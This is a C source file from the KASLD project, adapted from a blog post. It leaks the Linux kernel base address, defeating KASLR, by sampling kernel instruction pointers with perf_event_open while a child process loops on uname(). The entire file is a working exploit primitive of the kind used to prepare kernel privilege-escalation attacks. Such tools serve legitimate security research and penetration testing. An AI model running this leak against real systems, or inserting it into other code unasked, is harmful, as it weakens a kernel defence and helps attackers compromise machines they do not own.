// This file is part of KASLD - https://github.com/bcoles/kasld
// Infer kernel base by sampling kernel events and taking the lowest address
// Requires kernel.perf_event_paranoid < 2 (Default on Ubuntu 4.4.0 kernels)
// Largely based on original code by lizzie:
// - https://blog.lizzie.io/kaslr-and-perf.html

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/utsname.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

int perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags)
{
  return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

unsigned long get_kernel_addr_perf() {
  int fd;
  pid_t child;
  unsigned long iterations = 100;

  printf("[.] trying perf_event_open sampling ...\n");

  child = fork();

  if (child == -1) {
    printf("[-] fork() failed: %m\n");
    return 0;
  }

  if (child == 0) {
    struct utsname self = {{0}};
    while (1) uname(&self);
    return 0;
  }

  struct perf_event_attr event = {
    .type = PERF_TYPE_SOFTWARE,
    .config = PERF_COUNT_SW_TASK_CLOCK,
    .size = sizeof(struct perf_event_attr),
    .disabled = 1,
    .exclude_user = 1,
    .exclude_hv = 1,
    .sample_type = PERF_SAMPLE_IP,
    .sample_period = 10,
    .precise_ip = 1
  };

  fd = perf_event_open(&event, child, -1, -1, 0);

  if (fd < 0) {
    printf("[-] syscall(SYS_perf_event_open): %m\n");
    if (child) kill(child, SIGKILL);
    if (fd > 0) close(fd);
    return 0;
  }

  uint64_t page_size = getpagesize();
  struct perf_event_mmap_page *meta_page = NULL;
  meta_page = mmap(NULL, (page_size * 2), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  if (meta_page == MAP_FAILED) {
    printf("[-] mmap() failed: %m\n");
    if (child) kill(child, SIGKILL);
    if (fd > 0) close(fd);
    return 0;
  }

  if (ioctl(fd, PERF_EVENT_IOC_ENABLE)) {
    printf("[-] ioctl failed: %m\n");
    if (child) kill(child, SIGKILL);
    if (fd > 0) close(fd);
    return 0;
  }
  char *data_page = ((char *) meta_page) + page_size;

  size_t progress = 0;
  uint64_t last_head = 0;
  size_t num_samples = 0;
  unsigned long min_addr = ~0;
  while (num_samples < iterations) {
    /* is reading from the meta_page racy? no idea */
    while (meta_page->data_head == last_head);;
    last_head = meta_page->data_head;

    while (progress < last_head) {
      struct __attribute__((packed)) sample {
        struct perf_event_header header;
        uint64_t ip;
      } *here = (struct sample *) (data_page + progress % page_size);
      switch (here->header.type) {
      case PERF_RECORD_SAMPLE:
        num_samples++;
        if (here->header.size < sizeof(*here)) {
          printf("[-] size too small.\n");
          if (child) kill(child, SIGKILL);
          if (fd > 0) close(fd);
          return 0;
        }

        uint64_t prefix = here->ip;

        if (prefix < min_addr) min_addr = prefix;
        break;
      case PERF_RECORD_THROTTLE:
      case PERF_RECORD_UNTHROTTLE:
      case PERF_RECORD_LOST:
        break;
      default:
        printf("[-] unexpected perf event: %x\n", here->header.type);
        if (child) kill(child, SIGKILL);
              if (fd > 0) close(fd);
        return 0;
      }
      progress += here->header.size;
    }
    /* tell the kernel we read it. */
    meta_page->data_tail = last_head;
  }

  if (child) kill(child, SIGKILL);
  if (fd > 0) close(fd);

  if (min_addr > KERNEL_BASE_MIN && min_addr < KERNEL_BASE_MAX)
    return min_addr;

  return 0;
}

int main (int argc, char **argv) {
  unsigned long addr = get_kernel_addr_perf();
  if (!addr) return 1;

  printf("lowest leaked address: %lx\n", addr);

  if ((addr & 0xfffffffffff00000ul) == (addr & 0xffffffffff000000ul)) {
    printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);
  } else {
    printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
    printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
  }

  return 0;
}

